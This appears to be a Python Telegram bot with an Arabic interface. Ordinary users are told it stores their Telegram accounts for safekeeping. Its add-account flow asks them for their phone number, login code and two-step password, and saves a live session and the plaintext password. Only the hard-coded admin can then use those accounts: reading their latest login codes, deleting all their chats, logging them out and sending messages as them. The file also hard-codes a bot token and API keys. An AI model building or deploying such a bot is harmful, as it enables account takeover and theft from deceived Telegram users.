```python
import os
from telethon.tl import functions
from telethon.sessions import StringSession
import asyncio, json
from kvsqlite.sync import Client as uu
from telethon import TelegramClient, events, Button
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

if not os.path.isdir('database'):
    os.mkdir('database')

API_ID = "21669021"
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
admin = 7072622935
token = "7315494223:AAFs_jejjsSrP7J8bDSprHM7KhAJ2nz3tSc"
client = TelegramClient('BotSession', API_ID, API_HASH).start(bot_token=token)
bot = client

# Create DataBase
db = uu('database/elhakem.ss', 'bot')

if not db.exists("accounts"):
    db.set("accounts", [])

def update_main_buttons():
    accounts = db.get("accounts")
    accounts_count = len(accounts)
    main_buttons = [
        [Button.inline("➕ إضافة حساب", data="add")],
        [Button.inline(f"📲 حساباتك ({accounts_count})", data="your_accounts")],
        [Button.inline("💾 نسخة احتياطية", data="backup")],
        [Button.inline("📂 رفع نسخة احتياطية", data="restore")],
        [Button.inline("🔍 البحث عن حساب", data="search_account")],
        [Button.inline("📊 إحصائيات الحسابات", data="account_stats")]
    ]
    return main_buttons

@client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
async def start(event):
    user_id = event.chat_id
    if user_id != admin:
        await event.reply("👋 أهلاً بك عزيزي! هذا البوت مخصص لتخزين حسابات تيليجرام ويمكنك استرجاعها في أي وقت.", buttons=[[Button.inline("➕ إضافة حساب", data="add")]])
        return

    await event.reply("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=update_main_buttons())

@client.on(events.callbackquery.CallbackQuery())
async def callback_handler(event):
    data = event.data.decode('utf-8') if isinstance(event.data, bytes) else str(event.data)
    user_id = event.chat_id
    accounts = db.get("accounts")

    if data == "back":
        await event.edit("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=update_main_buttons())

    elif data == "add":
        async with bot.conversation(user_id) as x:
            await x.send_message("✔️ الان ارسل رقمك مع رمز دولتك, مثال : +201000000000")
            txt = await x.get_response()
            phone_number = txt.text.replace("+", "").replace(" ", "")

            if any(account['phone_number'] == phone_number for account in accounts):
                await x.send_message("❌ - هذا الحساب تم إضافته مسبقًا.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                return

            app = TelegramClient(StringSession(), API_ID, API_HASH)
            await app.connect()
            password = None
            try:
                await app.send_code_request(phone_number)
            except (ApiIdInvalidError, PhoneNumberInvalidError):
                await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                return

            await x.send_message("📩 - تم ارسال كود التحقق الخاص بك علي تليجرام. أرسل الكود بالتنسيق التالي : 1 2 3 4 5")
            txt = await x.get_response()
            code = txt.text.replace(" ", "")
            try:
                await app.sign_in(phone_number, code)
                string_session = app.session.save()
                data = {"phone_number": phone_number, "two-step": "لا يوجد", "session": string_session}
                accounts.append(data)
                db.set("accounts", accounts)
                await x.send_message("✅ - تم حفظ الحساب بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
            except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                return
            except SessionPasswordNeededError:
                await x.send_message("🔐 - أرسل رمز التحقق بخطوتين الخاص بحسابك.")
                txt = await x.get_response()
                password = txt.text
                try:
                    await app.sign_in(password=password)
                except PasswordHashInvalidError:
                    await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    return
                string_session = app.session.save()
                data = {"phone_number": phone_number, "two-step": password, "session": string_session}
                accounts.append(data)
                db.set("accounts", accounts)
                await x.send_message("✅ - تم حفظ الحساب بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    elif data == "your_accounts":
        if len(accounts) == 0:
            await event.edit("⚠️ - لا يوجد حسابات مسجلة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
            return

        account_buttons = [[Button.inline(f"📱 {i['phone_number']}", data=f"get_{i['phone_number']}")] for i in accounts]
        account_buttons.append([Button.inline("🔙 رجوع", data="back")])
        await event.edit("🔍 - اختر الحساب لإدارة الخيارات:", buttons=account_buttons)

    elif data.startswith("get_"):
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                try:
                    await app.connect()
                    me = await app.get_me()
                    sessions = await app(functions.account.GetAuthorizationsRequest())
                    device_count = len(sessions.authorizations)

                    text = f"• رقم الهاتف : {phone_number}\n" \
                           f"- الاسم : {me.first_name} {me.last_name or ''}\n" \
                           f"- عدد الاجهزة المتصلة : {device_count}\n" \
                           f"- التحقق بخطوتين : {i['two-step']}"

                    account_action_buttons = [
                        [Button.inline("🔒 تسجيل خروج", data=f"logout_{phone_number}")],
                        [Button.inline("🧹 حذف المحادثات", data=f"delete_chats_{phone_number}")],
                        [Button.inline("📩 جلب اخر كود", data=f"code_{phone_number}")],
                        [Button.inline("🔙 رجوع", data="your_accounts")],
                        [Button.inline("📩 إرسال رسالة", data=f"send_message_{phone_number}")]
                    ]
                    await event.edit(text, buttons=account_action_buttons)
                except Exception as e:
                    accounts.remove(i)
                    db.set("accounts", accounts)
                    await event.edit("⚠️ لم يعد الوصول إلى هذا الحساب ممكناً وتم حذفه من القائمة.")
                finally:
                    await app.disconnect()
                break

    elif data == "backup":
        backup_data = {"accounts": accounts}
        with open("database/backup.json", "w") as backup_file:
            json.dump(backup_data, backup_file)
        await bot.send_file(user_id, "database/backup.json", caption="✅ تم إنشاء نسخة احتياطية بنجاح.")

    elif data == "restore":
        async with bot.conversation(user_id) as x:
            await x.send_message("📂 أرسل ملف النسخة الاحتياطية (backup.json)")
            response = await x.get_response()
            if response.file and response.file.name == "backup.json":
                await bot.download_media(response, "database/backup.json")
                with open("database/backup.json", "r") as backup_file:
                    backup_data = json.load(backup_file)
                db.set("accounts", backup_data["accounts"])
                await x.send_message("✅ تم استعادة النسخة الاحتياطية بنجاح", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    elif data.startswith("logout_"):
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                await app.connect()
                await app.log_out()
                await app.disconnect()

                accounts.remove(i)
                db.set("accounts", accounts)
                await event.edit(f"✅ - تم تسجيل الخروج من الحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])

    elif data.startswith("code_"):
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                await app.connect()
                code = await app.get_messages(777000, limit=1)
                await event.edit(f"📩 آخر كود تم استلامه: {code[0].message}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
                await app.disconnect()

    elif data.startswith("delete_chats_"):
        phone_number = data.split("_")[1]
        for i in accounts:
            if phone_number == i['phone_number']:
                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                await app.connect()
                
                total_deleted = 0
                async for dialog in app.iter_dialogs():
                    await app.delete_dialog(dialog.id)
                    total_deleted += 1
                    await event.edit(f"🗑️ جاري الحذف... تم حذف ({total_deleted}) محادثة حتى الآن.")
                
                await app.disconnect()
                await event.edit(f"✅ - تم حذف جميع المحادثات للحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])

    elif data.startswith("send_message_"):
        phone_number = data.split("_")[1]
        async with bot.conversation(user_id) as x:
            await x.send_message("✏️ اكتب الرسالة التي تود إرسالها:")
            message = await x.get_response()
            for i in accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    await app.connect()
                    await app.send_message("me", message.text)  # Send message to self as a test
                    await app.disconnect()
                    await x.send_message("✅ تم إرسال الرسالة بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                    break

    elif data == "search_account":
        async with bot.conversation(user_id) as x:
            await x.send_message("🔍 اكتب رقم الهاتف للبحث عن الحساب:")
            search_number = await x.get_response()
            found_accounts = [acc for acc in accounts if search_number.text in acc['phone_number']]
            if found_accounts:
                result_buttons = [[Button.inline(f"📱 {acc['phone_number']}", data=f"get_{acc['phone_number']}")] for acc in found_accounts]
                result_buttons.append([Button.inline("🔙 رجوع", data="back")])
                await x.send_message("📋 الحسابات التي تم العثور عليها:", buttons=result_buttons)
            else:
                await x.send_message("❌ لم يتم العثور على حسابات بهذا الرقم.", buttons=[[Button.inline("🔙 رجوع", data="back")]])

    elif data == "account_stats":
        if len(accounts) == 0:
            await event.edit("⚠️ - لا يوجد حسابات مسجلة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
            return
        
        total_accounts = len(accounts)
        total_logged_in = sum(1 for acc in accounts if acc['two-step'] == "لا يوجد")
        total_with_two_step = total_accounts - total_logged_in

        stats_text = f"📊 إحصائيات الحسابات:\n" \
                     f"• إجمالي الحسابات: {total_accounts}\n" \
                     f"• الحسابات المسجلة بدون تحقق بخطوتين: {total_logged_in}\n" \
                     f"• الحسابات المسجلة مع تحقق بخطوتين: {total_with_two_step}"

        await event.edit(stats_text, buttons=[[Button.inline("🔙 رجوع", data="back")]])

client.run_until_disconnected()
